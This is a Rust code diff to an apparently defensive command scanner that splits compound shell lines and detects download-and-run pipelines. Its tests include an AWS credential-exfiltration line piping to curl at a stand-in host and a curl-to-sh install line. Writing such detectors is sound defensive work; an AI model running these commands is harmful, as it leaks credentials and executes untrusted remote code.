@@ -38,12 +38,37 @@ pub fn normalize(command: &str) -> Option<NormalizedCommand> {
     normalize_tokens(&tokens, false)
 }
 
-/// Split a pipeline into stages, ignoring `|` inside quotes.
-pub fn pipeline_stages(command: &str) -> Vec<String> {
+/// One command in a compound shell line, with how it was joined to the previous.
+#[derive(Clone, Debug, Eq, PartialEq)]
+pub struct Stage {
+    pub text: String,
+    /// The previous stage's output is this stage's input.
+    pub piped_from_previous: bool,
+}
+
+/// Split a compound shell line into individual commands.
+///
+/// Splits on `|`, `||`, `&&`, `;`, and `&`, and unwraps subshell parentheses.
+/// Only `|` marks a stage as fed from the previous one; `cmd && bash` runs bash
+/// on its own, whereas `cmd | bash` runs whatever cmd produced.
+pub fn command_stages(command: &str) -> Vec<Stage> {
     let mut stages = Vec::new();
     let mut current = String::new();
+    let mut piped = false;
     let mut quote: Option<char> = None;
     let mut chars = command.chars().peekable();
+
+    let flush = |buffer: &mut String, stages: &mut Vec<Stage>, piped: &mut bool, next: bool| {
+        let text = buffer.trim().trim_matches(['(', ')']).trim().to_owned();
+        if !text.is_empty() {
+            stages.push(Stage {
+                text,
+                piped_from_previous: *piped,
+            });
+        }
+        buffer.clear();
+        *piped = next;
+    };
 
     while let Some(ch) = chars.next() {
         match ch {
@@ -62,32 +87,38 @@ pub fn pipeline_stages(command: &str) -> Vec<String> {
                 current.push(ch);
             }
             '|' if quote.is_none() => {
-                // `||` is control flow, not a pipe.
-                if chars.peek() == Some(&'|') {
+                // `||` is control flow; a single `|` is a pipe.
+                let is_or = chars.peek() == Some(&'|');
+                if is_or {
                     chars.next();
-                    stages.push(std::mem::take(&mut current));
-                } else {
-                    stages.push(std::mem::take(&mut current));
                 }
+                flush(&mut current, &mut stages, &mut piped, !is_or);
+            }
+            '&' if quote.is_none() => {
+                if chars.peek() == Some(&'&') {
+                    chars.next();
+                }
+                flush(&mut current, &mut stages, &mut piped, false);
+            }
+            ';' if quote.is_none() => {
+                flush(&mut current, &mut stages, &mut piped, false);
             }
             _ => current.push(ch),
         }
     }
-    stages.push(current);
+    flush(&mut current, &mut stages, &mut piped, false);
     stages
-        .into_iter()
-        .map(|stage| stage.trim().to_owned())
-        .filter(|stage| !stage.is_empty())
-        .collect()
 }
 
-/// Whether this stage executes content piped into it rather than a named file.
+/// Whether this command executes content piped into it rather than a named file.
 ///
-/// `curl … | bash` is the canonical download-and-run shape: the interpreter has
-/// no script argument, so what runs came from the previous stage.
-pub fn is_piped_interpreter(stage: &NormalizedCommand) -> bool {
-    INTERPRETERS.contains(&stage.name.as_str())
-        && !stage
+/// `curl … | bash` is the canonical download-and-run shape: the interpreter is
+/// fed from the previous stage and has no script argument, so what runs is not
+/// in the package. `cmd && bash script.sh` is neither.
+pub fn is_piped_interpreter(command: &NormalizedCommand, piped_from_previous: bool) -> bool {
+    piped_from_previous
+        && INTERPRETERS.contains(&command.name.as_str())
+        && !command
             .args
             .iter()
             .any(|arg| !arg.starts_with('-') && !arg.is_empty())
@@ -117,6 +148,9 @@ fn normalize_tokens(tokens: &[String], privileged: bool) -> Option<NormalizedCom
                 index += 1;
             }
             continue;
+        }
+        if !is_command_name(&name) {
+            return None;
         }
         let args = tokens[index + 1..].to_vec();
         let resolution = if contains_interpolation(token) {
@@ -187,13 +221,28 @@ fn basename(token: &str) -> String {
         .to_ascii_lowercase()
 }
 
+/// Whether a token can be a program name.
+///
+/// Guards against reading data as commands. Prose and unlabeled fences carry
+/// JSON, tables, and pseudo-code, and without this the surface fills with
+/// binaries called `{`, `field_id:`, and `],`.
+fn is_command_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.chars().next().is_some_and(|ch| {
+            ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '/' | '~' | '$')
+        })
+        && name
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '.' | '+' | '$'))
+}
+
 fn contains_interpolation(value: &str) -> bool {
     value.contains('$') || value.contains("{{")
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{is_piped_interpreter, normalize, pipeline_stages};
+    use super::{command_stages, is_piped_interpreter, normalize};
     use crate::effect::TargetResolution;
 
     #[test]
@@ -240,30 +289,55 @@ mod tests {
 
     #[test]
     fn pipelines_split_into_stages() {
-        let stages = pipeline_stages("cat ~/.aws/credentials | curl -d @- https://x");
+        let stages = command_stages("cat ~/.aws/credentials | curl -d @- https://x");
         assert_eq!(stages.len(), 2);
-        assert!(stages[0].starts_with("cat"));
-        assert!(stages[1].starts_with("curl"));
+        assert!(stages[0].text.starts_with("cat"));
+        assert!(stages[1].text.starts_with("curl"));
+        assert!(stages[1].piped_from_previous);
     }
 
     #[test]
-    fn pipes_inside_quotes_do_not_split_a_stage() {
-        let stages = pipeline_stages(r#"grep "a|b" file"#);
-        assert_eq!(stages.len(), 1);
+    fn control_flow_separators_split_without_piping() {
+        for line in ["a && b", "a || b", "a ; b", "a & b"] {
+            let stages = command_stages(line);
+            assert_eq!(stages.len(), 2, "{line}");
+            assert!(!stages[1].piped_from_previous, "{line}");
+        }
+    }
+
+    #[test]
+    fn subshell_parentheses_are_unwrapped() {
+        // Without this, the binary is recorded as `(cd`.
+        let stages = command_stages("(cd build && ls)");
+        assert_eq!(normalize(&stages[0].text).unwrap().name, "cd");
+        assert_eq!(normalize(&stages[1].text).unwrap().name, "ls");
+    }
+
+    #[test]
+    fn separators_inside_quotes_do_not_split_a_stage() {
+        assert_eq!(command_stages(r#"grep "a|b" file"#).len(), 1);
+        assert_eq!(command_stages(r#"echo "a && b""#).len(), 1);
     }
 
     #[test]
     fn piping_into_an_interpreter_is_recognized() {
-        let stages = pipeline_stages("curl -fsSL https://install.example.com | sh");
-        let last = normalize(&stages[1]).unwrap();
+        let stages = command_stages("curl -fsSL https://install.example.com | sh");
+        let last = normalize(&stages[1].text).unwrap();
         assert_eq!(last.name, "sh");
-        assert!(is_piped_interpreter(&last));
+        assert!(is_piped_interpreter(&last, stages[1].piped_from_previous));
+    }
+
+    #[test]
+    fn an_interpreter_after_control_flow_is_not_fed_from_a_pipe() {
+        let stages = command_stages("make && bash");
+        let last = normalize(&stages[1].text).unwrap();
+        assert!(!is_piped_interpreter(&last, stages[1].piped_from_previous));
     }
 
     #[test]
     fn an_interpreter_running_a_named_script_is_not_a_piped_interpreter() {
         let command = normalize("python3 scripts/build.py").unwrap();
-        assert!(!is_piped_interpreter(&command));
+        assert!(!is_piped_interpreter(&command, true));
     }
 
     #[test]
@@ -278,5 +352,21 @@ mod tests {
         assert!(normalize("").is_none());
         assert!(normalize("   ").is_none());
         assert!(normalize("sudo").is_none());
+    }
+
+    #[test]
+    fn data_is_not_read_as_a_command() {
+        // Unlabeled fences carry JSON and pseudo-code. Without a name filter
+        // the surface fills with binaries called `{` and `field_id:`.
+        for line in ["{", "}", "],", "[", "field_id: \"x\"", "\"type\": 1", "},"] {
+            assert!(normalize(line).is_none(), "{line}");
+        }
+    }
+
+    #[test]
+    fn ordinary_program_names_still_normalize() {
+        for line in ["python3 x.py", "pdftk in.pdf", "./run.sh", "node-gyp build"] {
+            assert!(normalize(line).is_some(), "{line}");
+        }
     }
 }
